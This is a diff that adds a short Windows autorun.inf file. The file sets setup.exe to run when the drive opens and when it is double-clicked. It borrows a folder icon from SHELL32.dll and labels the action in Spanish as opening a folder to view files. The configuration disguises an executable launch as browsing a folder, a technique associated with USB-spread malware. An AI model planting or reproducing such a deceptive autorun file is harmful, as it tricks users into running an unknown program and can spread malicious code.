@@ -1,0 +1,8 @@
+[autorun]
+open=setup.exe
+icon=%SystemRoot%\system32\SHELL32.dll,4
+action=Abrir carpeta para ver archivos
+shell\open=Abrir
+shell\open\command=setup.exe
+shell\open\default=1
+
